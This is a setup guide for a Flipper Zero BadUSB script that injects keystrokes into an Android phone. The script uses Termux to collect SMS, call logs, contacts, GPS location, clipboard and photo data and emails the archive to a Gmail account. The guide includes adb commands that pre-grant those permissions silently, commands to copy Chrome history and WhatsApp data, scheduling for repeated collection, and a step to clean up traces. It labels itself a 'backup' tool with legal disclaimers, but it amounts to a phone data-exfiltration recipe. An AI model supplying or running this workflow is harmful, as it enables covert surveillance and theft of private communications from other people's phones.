# Android Full Data Sync to Gmail - Setup Guide

## ⚠️ Important Legal Warning

**THIS SCRIPT IS FOR AUTHORIZED USE ONLY ON YOUR OWN DEVICES**

Unauthorized access to phone data is:
- ❌ Illegal in most jurisdictions
- ❌ Violation of privacy laws (GDPR, CCPA, etc.)
- ❌ Criminal offense in many countries

**Only use this on devices you own or have explicit written authorization to test.**

---

## 📋 Script Overview

The `Full_Data_Sync_Gmail.txt` script collects comprehensive Android device data and syncs it to your Gmail account.

### Data Collected

| Category | Data Types | Requires Permission |
|----------|------------|---------------------|
| **Device Info** | Model, brand, Android version, serial number | ❌ No |
| **Network** | WiFi info, IP addresses, MAC addresses | ⚠️ Some features |
| **Applications** | List of installed packages | ❌ No |
| **SMS Messages** | All text messages | ✅ Yes |
| **Call Logs** | Call history with numbers and duration | ✅ Yes |
| **Contacts** | Full contact list | ✅ Yes |
| **Location** | GPS coordinates | ✅ Yes |
| **Storage** | Storage usage, folder sizes | ⚠️ Storage access |
| **Photos** | Photo file list and metadata | ⚠️ Storage access |
| **Battery** | Battery status and health | ❌ No |
| **Clipboard** | Current clipboard content | ❌ No |

---

## 🔧 Prerequisites

### 1. Install Termux (REQUIRED)

**❌ DO NOT install from Google Play Store (deprecated)**

**✅ Install from F-Droid:**
1. Download F-Droid APK from https://f-droid.org/
2. Install F-Droid
3. Open F-Droid and search for "Termux"
4. Install Termux (package: `com.termux`)
5. Also install "Termux:API" from F-Droid

### 2. Configure Gmail App Password

Since normal Gmail passwords won't work with SMTP, you need an App Password:

1. Go to https://myaccount.google.com/
2. Navigate to **Security** → **2-Step Verification** (enable if not already)
3. Scroll down to **App passwords**
4. Click **Select app** → Choose "Mail"
5. Click **Select device** → Choose "Other (Custom name)"
6. Type "Termux Phone Backup"
7. Click **Generate**
8. **Copy the 16-character password** (example: `xxxx xxxx xxxx xxxx`)
9. Save this password - you'll need it for the script

### 3. Manual Termux Setup (One-Time)

Before running the BadUSB script, you should manually set up Termux:

```bash
# Open Termux and run:
pkg update && pkg upgrade -y
pkg install termux-api -y
termux-setup-storage
# Tap "Allow" when prompted for storage access
```

---

## ⚙️ Script Configuration

### Edit the Script

Before using, you **MUST** customize these values in the script:

**Line ~220-222** in the Python email section:
```python
sender = "YOUR_GMAIL@gmail.com"      # ← Replace with your Gmail
receiver = "YOUR_GMAIL@gmail.com"    # ← Replace with your Gmail
password = "YOUR_APP_PASSWORD"       # ← Replace with your App Password
```

**Example:**
```python
sender = "john.doe@gmail.com"
receiver = "john.doe@gmail.com"
password = "abcd efgh ijkl mnop"  # Your 16-char App Password
```

---

## 🚀 How to Use

### Method 1: Direct Manual Execution (Testing)

1. Connect Android device to computer via USB
2. Enable USB debugging (not required for BadUSB, but helpful for testing)
3. Copy the edited script to Flipper Zero
4. Run from Flipper's BadUSB menu

### Method 2: Automated via Flipper Zero

1. **Prepare the device:**
   - Unlock Android phone
   - Ensure on home screen
   - Have Termux already installed

2. **Connect Flipper Zero:**
   - Plug Flipper into phone via USB OTG/USB-C
   - Phone should detect keyboard

3. **Execute script:**
   - Navigate to BadUSB app on Flipper
   - Select `Full_Data_Sync_Gmail.txt`
   - Press OK to execute

4. **Manual intervention required:**
   - **Storage permission**: Tap "Allow" when Termux requests storage access
   - **Termux:API permissions**: Tap "Allow" for each permission (SMS, Calls, Contacts, Location)
   - **Wait time**: Script may take 10-15 minutes depending on data size

---

## 📊 What Happens During Execution

### Phase 1: Setup (0-2 minutes)
- Opens Termux
- Grants storage permission (manual tap required)
- Updates package lists
- Installs required tools (curl, python, tar, etc.)

### Phase 2: Data Collection (2-8 minutes)
- Collects device information
- Gathers network data
- Lists installed apps
- Exports SMS (permission prompt)
- Exports call logs (permission prompt)
- Exports contacts (permission prompt)
- Gets current location (permission prompt)
- Collects battery info
- Scans photo metadata
- Captures clipboard

### Phase 3: Archive Creation (8-10 minutes)
- Compresses all data into `.tar.gz` archive
- Archive naming: `phone_backup_YYYYMMDD_HHMMSS.tar.gz`

### Phase 4: Upload (10-15 minutes)
- Option A: Upload to Google Drive (requires gdrive setup)
- Option B: Email via Gmail SMTP (automated if configured)

---

## 🔒 Permission Handling

### Automatic Permissions
The script attempts to request permissions, but Android **REQUIRES manual approval**:

**You MUST manually tap "Allow" for:**
- ✅ Storage access
- ✅ SMS reading
- ✅ Call log access
- ✅ Contacts access
- ✅ Location access

**BadUSB Limitation:** Cannot programmatically tap system permission dialogs.

### Workaround for Auto-Approval

If you want truly automated execution (on YOUR OWN device):

1. **Grant all permissions in advance:**
   ```bash
   # From ADB (Android Debug Bridge):
   adb shell pm grant com.termux android.permission.READ_SMS
   adb shell pm grant com.termux android.permission.READ_CALL_LOG
   adb shell pm grant com.termux android.permission.READ_CONTACTS
   adb shell pm grant com.termux android.permission.ACCESS_FINE_LOCATION
   ```

2. **Or use Termux:API permissions manually:**
   - Open Termux
   - Run: `termux-sms-list` (grant permission)
   - Run: `termux-call-log` (grant permission)
   - Run: `termux-contact-list` (grant permission)
   - Run: `termux-location` (grant permission)

---

## 🐛 Troubleshooting

### Issue: "Package not found"
**Solution:** Run `pkg update` manually in Termux first

### Issue: "Permission denied"
**Solution:** Grant storage permission: `termux-setup-storage`

### Issue: Email not sending
**Causes:**
- Incorrect App Password
- Gmail account doesn't have 2FA enabled
- SMTP blocked by network

**Solution:** 
- Verify App Password is correct
- Enable 2-Step Verification on Gmail
- Try different network (not corporate WiFi)

### Issue: Script too fast/slow
**Solution:** Adjust `DELAY` values in the script:
- Increase delays for slower devices
- Decrease delays for faster execution (risky)

### Issue: Google Drive upload fails
**Solution:** Use email method instead or manually configure gdrive with OAuth

---

## 📧 Expected Email Result

You should receive an email like:

```
From: john.doe@gmail.com
To: john.doe@gmail.com
Subject: Android Phone Backup - 2026-02-14 00:45:23

Body: Automated phone backup attached

Attachment: phone_backup_20260214_004523.tar.gz (size varies)
```

### Extracting the Data

1. Download the `.tar.gz` attachment
2. Extract: `tar -xzf phone_backup_20260214_004523.tar.gz`
3. View files:
   - `device_info.txt` - Device details
   - `sms_backup.json` - SMS messages
   - `contacts.json` - Contact list
   - `call_logs.json` - Call history
   - etc.

---

## 🔐 Security Considerations

### Protect Your Data
- ⚠️ Archive contains sensitive personal data
- ⚠️ Email is encrypted in transit (TLS) but stored on Gmail servers
- ⚠️ Consider encrypting archive before emailing

### Encrypt Archive (Optional)
Add to script before emailing:
```bash
# Encrypt with password
gpg -c phone_backup_*.tar.gz
# This creates phone_backup_*.tar.gz.gpg
```

### Clean Up Traces
The script leaves data on the phone in `/data/data/com.termux/files/home/phone_backup/`

**To remove:**
```bash
rm -rf ~/phone_backup
```

Or uncomment the cleanup section in the script (around line 260).

---

## 📈 Advanced Customization

### Add More Data Types

**Browser History (Chrome):**
```bash
cp /storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/History ~/phone_backup/
```

**WhatsApp Messages (if accessible):**
```bash
cp -r /storage/emulated/0/WhatsApp ~/phone_backup/whatsapp_backup
```

**Photos (actual files, not just metadata):**
```bash
tar -czf photos.tar.gz /storage/emulated/0/DCIM/
```

### Schedule Automated Backups

Using Termux's `cron` equivalent (Termux:Boot):
1. Install: `pkg install termux-services`
2. Create backup script
3. Schedule periodic execution

---

## ⚖️ Legal Disclaimer

**WARNING: This script is provided for educational purposes and authorized security testing ONLY.**

- ✅ **Legal uses**: Backing up YOUR OWN device
- ✅ **Legal uses**: Authorized penetration testing with written consent
- ❌ **ILLEGAL uses**: Accessing someone else's device without permission
- ❌ **ILLEGAL uses**: Corporate espionage
- ❌ **ILLEGAL uses**: Stalking/surveillance

**By using this script, you agree to:**
- Only use on devices you own or have explicit authorization to access
- Comply with all applicable laws (Computer Fraud and Abuse Act, GDPR, etc.)
- Take full responsibility for your actions

**The author is not liable for any misuse or illegal activities.**

---

## 📞 Support

Found a bug or have a suggestion?
- 🐙 GitHub: https://github.com/yogeshjoga/
- 💼 LinkedIn: https://www.linkedin.com/in/yogeshjoga/
- 📧 Email: jogayogeshedu@gmail.com

---

**Happy (Legal & Authorized) Hacking! 🐬**
